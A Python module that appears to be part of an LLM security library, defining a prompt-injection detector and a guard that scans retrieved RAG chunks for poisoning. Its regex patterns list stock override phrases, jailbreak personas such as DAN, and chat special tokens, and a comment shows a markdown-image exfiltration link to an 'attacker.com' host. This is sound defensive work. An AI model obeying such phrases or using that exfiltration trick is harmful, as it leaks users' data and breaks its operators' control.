from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Any

from chad.security.threat import ThreatLevel

DEFAULT_INJECTION_PATTERNS: list[tuple[str, re.Pattern[str], ThreatLevel]] = [
    (
        "System Override Keyword",
        re.compile(
            r"(?:ignore|disregard|forget|override)\s+(?:all\s+)?(?:previous|prior|above|system)\s+(?:instructions|prompts|rules|directions)",
            re.IGNORECASE,
        ),
        ThreatLevel.HIGH,
    ),
    (
        "Roleplay / Jailbreak Persona",
        re.compile(
            r"\b(?:you\s+are\s+now|act\s+as|pretend\s+to\s+be)\s+(?:DAN|Developer\ Mode|unfiltered|jailbroken|godmode)\b",
            re.IGNORECASE,
        ),
        ThreatLevel.HIGH,
    ),
    (
        "Special Token Manipulation",
        re.compile(
            r"<\|im_start\|>|<\|im_end\|>|<\|endoftext\|>|SYSTEM_INSTRUCTION:",
            re.IGNORECASE,
        ),
        ThreatLevel.CRITICAL,
    ),
    (
        "Instruction Hijack Tag",
        re.compile(
            r"</?untrusted_content>|</?system_override>|</?admin>",
            re.IGNORECASE,
        ),
        ThreatLevel.MEDIUM,
    ),
]


@dataclass(frozen=True, slots=True)
class InjectionDetectionResult:
    is_injection: bool
    confidence: float
    threat_level: ThreatLevel
    matched_rules: tuple[str, ...]
    sanitized_text: str

    def to_dict(self) -> dict[str, Any]:
        return {
            "is_injection": self.is_injection,
            "confidence": self.confidence,
            "threat_level": self.threat_level.name,
            "matched_rules": list(self.matched_rules),
            "sanitized_text": self.sanitized_text,
        }


class PromptInjectionDetector:
    """Detects and sanitizes direct and indirect prompt injection attacks."""

    def __init__(
        self,
        custom_patterns: list[tuple[str, re.Pattern[str], ThreatLevel]] | None = None,
    ) -> None:
        self.patterns = custom_patterns or DEFAULT_INJECTION_PATTERNS

    def detect(self, text: str) -> InjectionDetectionResult:
        if not text:
            return InjectionDetectionResult(
                is_injection=False,
                confidence=0.0,
                threat_level=ThreatLevel.LOW,
                matched_rules=(),
                sanitized_text="",
            )

        matched_rules: list[str] = []
        highest_level = ThreatLevel.LOW
        level_order = [ThreatLevel.LOW, ThreatLevel.MEDIUM, ThreatLevel.HIGH, ThreatLevel.CRITICAL]

        sanitized = text
        for rule_name, pattern, level in self.patterns:
            if pattern.search(text):
                matched_rules.append(rule_name)
                if level_order.index(level) > level_order.index(highest_level):
                    highest_level = level
                # Sanitize / escape special tokens
                sanitized = pattern.sub(f"[REDACTED_INJECTION_PATTERN:{rule_name}]", sanitized)

        is_injection = len(matched_rules) > 0
        confidence = min(1.0, 0.4 + 0.3 * len(matched_rules)) if is_injection else 0.0

        return InjectionDetectionResult(
            is_injection=is_injection,
            confidence=confidence,
            threat_level=highest_level,
            matched_rules=tuple(matched_rules),
            sanitized_text=sanitized,
        )


@dataclass(frozen=True, slots=True)
class PoisoningAnalysisResult:
    is_poisoned: bool
    risk_score: float
    reasons: tuple[str, ...]
    cleaned_chunk: str


class RetrievalPoisoningGuard:
    """Inspects retrieved RAG chunks or external web evidence for retrieval poisoning and hidden attacks."""

    def __init__(self, detector: PromptInjectionDetector | None = None) -> None:
        self.detector = detector or PromptInjectionDetector()

    def inspect_chunk(self, chunk_text: str) -> PoisoningAnalysisResult:
        if not chunk_text:
            return PoisoningAnalysisResult(
                is_poisoned=False,
                risk_score=0.0,
                reasons=(),
                cleaned_chunk="",
            )

        reasons: list[str] = []
        cleaned = chunk_text

        # Check for zero-width / hidden unicode characters used for steganography
        zero_width_pattern = re.compile(r"[\u200B-\u200D\uFEFF]")
        if zero_width_pattern.search(chunk_text):
            reasons.append("Hidden zero-width steganographic unicode characters detected.")
            cleaned = zero_width_pattern.sub("", cleaned)

        # Check injection detector
        inj_res = self.detector.detect(cleaned)
        if inj_res.is_injection:
            reasons.append(
                f"Prompt injection patterns detected: {', '.join(inj_res.matched_rules)}"
            )
            cleaned = inj_res.sanitized_text

        # Check for exfiltration triggers inside text (e.g., markdown image exfiltration: ![img](http://attacker.com/leak?data=...))
        exfil_pattern = re.compile(r"!\[.*?\]\(https?://[^\s)]+\?[^\s)]+\)")
        if exfil_pattern.search(chunk_text):
            reasons.append("Markdown image data exfiltration pattern detected in chunk.")
            cleaned = exfil_pattern.sub("[REDACTED_EXFIL_IMAGE]", cleaned)

        is_poisoned = len(reasons) > 0
        risk_score = min(1.0, 0.5 * len(reasons)) if is_poisoned else 0.0

        return PoisoningAnalysisResult(
            is_poisoned=is_poisoned,
            risk_score=risk_score,
            reasons=tuple(reasons),
            cleaned_chunk=cleaned,
        )
